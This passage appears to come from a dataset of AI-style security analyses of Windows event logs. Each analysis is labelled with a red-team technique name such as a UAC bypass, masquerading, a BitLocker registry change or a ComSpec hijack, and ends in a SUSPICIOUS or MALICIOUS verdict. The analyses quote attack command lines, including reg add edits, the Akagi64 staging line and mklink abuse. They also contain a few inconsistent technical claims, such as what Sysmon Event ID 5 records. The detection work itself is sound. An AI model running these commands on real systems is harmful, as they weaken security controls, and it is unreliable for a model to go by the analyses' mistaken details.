- The coordinated time changes and registry modifications are usually aligned with evasive maneuvers.
- Known benign services and processes are involved, but their usage context is suspect.

Thus, I categorize the overall findings as **SUSPICIOUS**. This activity doesn't definitively prove a malicious breach on its own, but strongly suggests further investigation is needed. This would include:
- Cross-referencing with network activity logs for any data exfiltration attempts.
- Performing file integrity checks to ensure executables have not been tampered with.
- Assessing registry states for unexpected values or changes beyond what is noted.
- Reviewing the user application activity surrounding the time of these events for context.

Immediate investigation into potential breaches or unauthorized activities by the `SERVER002\admin_test` user account does warrant priority."
Invoke CHM with Script Engine and Help Topic,"### Log Analysis Summary

#### Anomalous and Suspicious Activities:

1. **Multiple Invocations of PowerShell**:
   - The logs indicate multiple instances of PowerShell being executed (`powershell.exe`) with an unusual command line argument: `""powershell.exe"" & {Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}`.
   - The command seems to execute a JScript, possibly using a Help file (CHM), which could be a method to execute arbitrary code on the system.

2. **Frequent Execution of `wevtutil.exe` and `conhost.exe`**:
   - `wevtutil.exe` is executed multiple times consecutively, which is not typically seen in normal operations unless logs are being queried or manipulated.
   - `conhost.exe` acts as a command line host in Windows and its frequent invocations could suggest command line activities that aren't directly visible.

3. **Suspicious Use of PowerShell and Hostname/Whoami Commands**:
   - Commands such as `hostname.exe` and `whoami.exe` are executed, which could indicate an attacker trying to gather information about the machine and the user context.
   - These commands executed in conjunction with PowerShell suggest reconnaissance activity.

4. **SYSmon Logs and Event IDs**:
   - Event ID 1 (process creation) and Event ID 5 (process termination) are recurring. This can provide context about processes starting and stopping in a short time frame.
   - The use of Sysmon to record these events shows the involvement of system monitoring, possibly triggered by suspicious activities.

5. **Batch Execution of Microsoft Edge Update Processes**:
   - The Microsoft Edge update and installation logs seem routine as part of system updates. However, they should be verified for legitimacy to rule out any possible tampering or false flags.

#### Conclusion:

Based on the provided logs:

- The invocation of PowerShell with unusual command-line arguments specifically designed to execute potentially dangerous scripts is highly suspicious. The `Invoke-ATHCompiledHelp` function, coupled with leveraging CHM files, is a known technique for launching attacks such as malware payloads.
- The sequence of running system commands (`hostname`, `whoami`) along with PowerShell might indicate reconnaissance, a typical phase in a cyber attack.
- The repetitive execution of system utilities (`wevtutil.exe`) could hint at log tampering or excessive information gathering through event logs.

### Recommended Resolution: **SUSPICIOUS**

Given the evidence of potentially harmful PowerShell activity, reconnaissance patterns, and unusual process behavior, the activity logs are flagged as **SUSPICIOUS** and warrant further investigation. It is essential to follow up with:

- A deeper audit of logs for other anomalies around the same timestamps.
- Verification of the executed scripts and their source or origin within the system.
- Checking for any unauthorized or unexpected accounts/privileges used during these processes.

UACME Bypass Method 31,"**Detailed Analysis of the Logs:**

Upon reviewing the provided Windows event logs, I've identified several noteworthy points:

1. **Unusual Command Execution:**
   - Cmd.exe is observed executing with the command line to echo a path with ""Akagi64.exe"". This name is frequently associated with tools used by advanced persistent threat (APT) actors, particularly those related to privilege escalation or bypass techniques.
   - The command `cmd.exe /c echo C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\script\31 Akagi64.exe` is particularly suspicious because it may suggest staging or execution of a potentially malicious script or application.

2. **PowerShell Usage:**
   - The usage of PowerShell for testing path presence of files in temporary folders can often indicate malicious activity, especially in the context of potential privilege escalation tools like Akagi.

3. **High Integrity Level Processes:**
   - Several processes such as cmd.exe and whoami.exe are executed at a 'High' integrity level by an admin_test user. The use of whoami.exe can be a tactic used by attackers to query the current user's name to ensure they're operating as expected within compromised systems.

4. **Frequent Service Stops and Starts related to Edge Update:**
   - There are numerous Sysmon logs related to Microsoft Edge Update processes. While these processes are generally benign, their presence in large numbers, especially with various command-line arguments, raises questions about potentially malicious code masquerading as legitimate processes.

5. **Suspicious Use of Wevtutil:**
   - The sequence of wevtutil.exe executions may indicate attempts to manipulate or clear event logs, which is a known tactic used by attackers to cover their tracks.

6. **Multiple High Integrity Processes Involving Edge Update:**
   - Repeated execution of MicrosoftEdgeUpdate processes in different directories, including temporary folders, can be a sign of a masquerading attack. These could potentially be malicious binaries disguised as legitimate updates.

**Assessment:**
- The cumulative evidence, particularly the unusual execution of cmd.exe with references to Akagi64.exe and the associated PowerShell command, aligns with behavior typically observed during malicious activities. The suspected use of privilege escalation tools, combined with the manipulation of event logs, presents a compelling case for potential compromise.

**Resolution:**
- **MALICIOUS**: The log entries strongly suggest malicious activity, consistent with known adversarial tactics, techniques, and procedures (TTPs). Immediate action is recommended.

**Guidance on How to Proceed:**
1. **Containment:**
   - Isolate the affected machine (Server002) from the network to prevent potential lateral movement or further access by the attacker.
   
2. **Eradication:**
   - Conduct a detailed forensic analysis using the full scope of event logs, memory dumps, and any associated file hashes. Ensure Akagi64.exe and related binaries are analyzed for malicious attributes.
   - Remove any discovered malicious binaries and associated processes.

3. **Recovery:**
   - Restore the machine from a known good state.
   - Verify security patches and updates are current and implemented.

This situation requires immediate and thorough attention to prevent further damage or data loss."
Modify UseTPMKey Registry entry,"Upon analyzing the provided Windows event logs, the following points of interest were noted:

### Suspicious Observations:

1. **Wevtutil Activity**:
   - Multiple instances of `C:\Windows\System32\wevtutil.exe` were executed within a very short time frame by the user `SERVER002\admin_test`.
   - `Wevtutil.exe` is a legitimate Windows utility used for managing event logs, but rapid sequential executions could indicate an attempt to export or clear logs, often a technique used by attackers to cover tracks.

2. **Registry Modification**:
   - A command executed via `cmd.exe` modified the Windows registry key for BitLocker (`HKLM\SOFTWARE\Policies\Microsoft\FVE`). The command was:
     ```
     ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f
     ```
   - Executing such a command suggests a potential attempt to alter security settings, possibly indicating malicious intentions.

3. **WHOAMI and HOSTNAME Usage**:
   - Instances of `whoami.exe` and `hostname.exe` were executed. While these tools are benign themselves, they are common in scripts and payloads to gather system information post-compromise.

4. **High Integrity Level**:
   - Each command was executed at a high integrity level, implying administrative privileges.

### Benign Observations:

- **Edge Update Activities**:
  - A series of events related to Microsoft Edge Update seem routine. While there are numerous process executions, all appear to be standard update operations for Microsoft Edge.

- **Time Synchronization**:
  - Events related to time changes and synchronization (`svchost.exe` with `time.windows.com`) do not indicate malicious behavior.

### Assessment:
The highlighted activities, especially the repeated invocation of `wevtutil.exe` and the modification of registry settings using a command line, warrant further investigation. These actions, while not definitively malicious on their own, align with patterns commonly associated with post-exploitation activities.

### Resolution: SUSPICIOUS
The logs are classified as `SUSPICIOUS`. The activities observed related to `wevtutil.exe` and registry modification require further investigation to determine whether they are part of legitimate administrative tasks or the result of unauthorized activity.

Masquerading - wscript.exe running as svchost.exe,"After thorough analysis of the provided Windows event logs, several observations and findings were made, particularly focusing on potential indicators of suspicious or malicious activity:

### Observations:
1. **Security Log - Event ID 5379:**
   - These events marked failed attempts to retrieve credentials, indicated by ReturnCode `3221226021`, which translates to `STATUS_NO_SUCH_LOGON_SESSION`. This suggests failed credential use or enumeration attempts. The repeated targeting of a specific Microsoft Account (`02txoixylodcstop`) enhances the suspicion, signaling a potential brute-force or account enumeration effort.

2. **Sysmon Logs:**
   - **Suspicious Process Executions:**
     - A series of command lines associated with `cmd.exe` are seen, such as copying (`copy %%SystemRoot%%\\System32\\wscript.exe`) and executing scripts (masquerading `.vbs`), which are unconventional and indicative of potential script execution or payload deployment masquerading as legitimate services like `svchost.exe`.
     - Execution of a copied `svchost.exe` from user directories is particularly unusual, which generally should be running from `C:\\Windows\\System32\\`.

3. **PowerShell and System Logs:**
   - While not detailed in the logs, Event ID `5` in Sysmon logs focuses on file creation and could involve process creations typical of scripting or administrative task automation, though without command-line specifics. The logs don't explicitly highlight other PowerShell-based anomalies, but the presence of PowerShell and `wevtutil.exe` suggests potential attempts for log clearing or manipulation.

4. **System Log - Windows Update Events:**
   - The updates related to Microsoft Defender indicate scheduled, routine operations without further suspicious attributes. These operations coincide with system updates which are typically benign.

5. **Activities within Elevated Integrity Levels:**
   - Many processes operate at a High or System Integrity Level, indicating that these activities were under administrative contexts, possibly abusing admin privileges given to `SERVER002\\admin_test`.

6. **Sysmon Log - Event ID 1 Analysis:**
   - `cmd.exe` and other executions redirecting to temporary or obscure directories for command execution, along with script payloads, signals potential obfuscation or lateral movement techniques.

### Assessment:
The concurrent examination of suspicious command executions, administrative scripts, and failed credential attempts suggests an **anomalous activity pattern with high potential for malicious intent**. The behavior aligns with known hacker methodologies, such as reconnaissance via credential enumeration and using masqueraded compute objects for lateral movement or execution.

### Resolution: **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Interrupt potentially harmful processes tied to user account `admin_test` and any suspected illicit script running from user profiles.
   
2. **Credential & Access Review:**
   - Investigate user `admin_test` login activity and endorse a password reset or account lockout.
   - Review and audit all privileged accounts or services to determine further unauthorized access.

3. **System Rollback and Monitoring:**
   - Restore affected systems to a known clean state from backup.
   - Initiate extensive monitoring on `Server002` and the entire network, evaluating for lateral movement.

4. **Malware and Threat Hunting:**
   - Conduct in-depth malware scans, looking into identified script paths for drops or remnants.
   - Utilize threat intelligence to correlate observed activities with existing threat actor TTPs (Tactics, Techniques, and Procedures).

5. **Incident Reporting:**
   - Report the security incident to senior management and relevant security operations teams for compliance and organizational awareness.

Address these steps with urgency, as the logs display clear evidence of a compromised environment that warrants further immediate incident response actions."
manage-bde.wsf Signed Script Command Execution,"Based on the provided Windows event logs from various channels, here's a detailed analysis:

### Analysis

1. **Process Execution:**
   - **Multiple invocations of `wevtutil.exe` and `conhost.exe`:** These are command-line applications used for managing event logs and executing Windows console applications, respectively. The frequent starting of these processes in quick succession is unusual under normal circumstances.
   - **Frequent use of `whoami.exe` and `hostname.exe`:** These binaries are typically used for troubleshooting or system information gathering, which may indicate normal administrative activity.
   - **Suspicious `cmd.exe` Command:**
     - The command `cmd.exe /c set comspec=%%windir%%\\System32\\calc.exe & cscript %%windir%%\\System32\\manage-bde.wsf` stands out as suspicious. Here, the command temporarily changes the `ComSpec` environment variable to point to `calc.exe`, which could indicate an attempt to manipulate or bypass system operations in conjunction with a script execution using `cscript.exe`.

2. **Privilege Level:**
   - Processes are executed with a high integrity level, which is expected for administrative actions but needs verifying if the context aligns with normal operational routines.

3. **Time Synchronization:**
   - **Event ID 4616 (Security Logs):** Time was adjusted from `2024-10-25 18:41:56.7075400` to `2024-10-25 18:41:59.5898130` by `svchost.exe` running as `LOCAL SERVICE`. This could relate to legitimate network time synchronization.

4. **Parent-Child Process Relationships:**
   - Processes `hostname.exe`, `whoami.exe`, and `cmd.exe` have `wsmprovhost.exe` as their parent, a legitimate Windows process for managing Windows Remote Management operations. However, the specific commands executed are not common for typical remote management or scripting activities.
   
5. **Use of `svchost.exe`:**
   - Instances of `svchost.exe` running as `NT AUTHORITY\SYSTEM` are normal, but require context relating their operations to regular services.

### Assessment
While some events, such as time synchronization via `svchost.exe`, appear legitimate, the unusual execution frequency of `wevtutil.exe` and setting the `ComSpec` environment variable to execute `calc.exe` are red flags. This kind of command manipulation can indicate scripting attempts to override normal utility function in favor of launching unwanted or malicious processes.

### Conclusion

Given the suspicious command execution and anomalous behavior observed:

- **Resolution: SUSPICIOUS**

There's activity that doesn't look right—specifically the command with `cmd.exe`—that needs further investigation. The focus should be on understanding who initiated these commands and verifying any related scripts or automated tasks. Ensure to investigate the `SERVER002\admin_test` account activities, as it seems to be the context for most of these operations.

### Recommendations

1. **Conduct a thorough investigation** of the `SERVER002\admin_test` user account for potential unauthorized access or misuse.
   
2. **Review scripts and scheduled tasks** on the machine to ensure no malicious commands are disguised as legitimate operations.

3. **Isolate the machine** pending a full sweep by a threat detection tool or antivirus solution to uncover any latent threats.

4. **Enhance logging** and monitoring for command-line activities and environment variable changes to proactively detect anomalous activities."

   - Execution of `HOSTNAME.EXE`, `whoami.exe`, and especially `cmd.exe` with command line arguments designed to create directories, copy executables, and make symbolic links can indicate possible attempts to abuse privileges or backdoor creation (`mklink c:\testbypass.exe`).
   - The `cmd.exe` command attempting to manipulate the system directories is particularly suspicious and could be an indication of lateral movement or establishing persistence using legitimate system binaries.

### System Log Analysis:

1. **System Time Change Events (Event ID 1 and 24)**:
   - System time changes were logged using `svchost.exe`. Such events are not inherently malicious without additional context like intent or frequency. They are concurrently logged with security log time change events.

### Application and PowerShell Log Analysis:

- No unusual activities or log entries found in PowerShell and Application logs that were provided.

### Final Assessment and Resolution:

- **SUSPICIOUS**: 
  - The frequent execution of `wevtutil.exe` suggests potential log evasion or manipulation, though not conclusively malicious on its own.
  - The execution of `cmd.exe` with administrative privileges attempting to manipulate system binaries is highly suspicious.
  - Time changes by `svchost.exe` could be a red flag if investigated in conjunction with other anomalous activities.

### Recommendations:

1. **Further Investigation**: 
   - Examine logs for repeated or unauthorized use of `wevtutil.exe`.
   - Verify the legitimacy of the commands executed via `cmd.exe` especially relating to file manipulations.
   - Confirm whether the `admin_test` account performed these actions as part of legitimate administrative tasks.

2. **Immediate Action**:
   - Consider isolating the affected machine for a more in-depth investigation to prevent potential propagation of a threat.
   - Review user account activities and associated privileges for any anomalies.

3. **Strengthen Monitoring**: 
   - Enhance alerting for high-risk activities like privilege escalation, system time changes, and potential persistence mechanisms (e.g., symbolic link creation in critical directories)."
Disabling ShowUI Settings of Windows Error Reporting (WER),"Upon reviewing the provided Windows event logs, we can analyze the activities for any suspicious or malicious behavior. The analysis reveals the following key observations:

1. **Edge Update Activity**: 
   - The logs contain multiple entries related to Microsoft Edge's update process. The execution of ""MicrosoftEdgeUpdate.exe"" and related components like ""MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe"" and ""MicrosoftEdgeUpdateComRegisterShell64.exe"" occurs at various times. These processes operate under ""NT AUTHORITY\SYSTEM"", indicating they are legitimate system-level operations to update Microsoft Edge.

2. **PowerShell & CMD Execution**:
   - There are no specific logs related to PowerShell in this collection. However, there are Cmd.exe executions doing registry writes:
     - `cmd.exe /c reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v DontShowUI /t REG_DWORD /d 1 /f`
     - This command modifies Windows Error Reporting settings and can be a tactic to suppress error messages, potentially indicating an attempt to mitigate visibility during an unauthorized activity.

3. **Sysmon Logs**:
   - The logs show execution of typical command-line utilities like `hostname.exe`, `whoami.exe`, and `wevtutil.exe` by the user `SERVER002\admin_test`. While these can be legitimate, their presence in a specific sequence might indicate reconnaissance or further manipulation, especially if executed frequently or by unauthorized users.

4. **Service Termination**:
   - Entries in the application log show that the `edgeupdate` service was stopped twice. While service termination itself is not uncommon, frequency or patterns might be relevant if linked to suspicious behavior.

5. **Elevation of Privileges**:
   - No significant indicators show attempts at privilege escalation outside the normal operations by SYSTEM level tasks related to Edge Update.

**Assessment**:
- The repetitive Microsoft Edge Update activities do not inherently indicate malicious behavior, given they are known applications with expected system privileges.
- The modification in Windows Error Reporting settings via the command prompt could be noteworthy. Although it alters settings related to Windows Error Reporting, it could be benign in some scenarios like automation scripts but might indicate concealment in others.

**Resolution**:
Based on the current evidence from the logs:
- **SUSPICIOUS** – The modification of registry values through `cmd.exe` stands out and should be further investigated to verify if it aligns with legitimate administrative behavior or if it indicates something more nefarious. Further investigation into the context of cmd.exe execution is advised to determine its legitimacy."
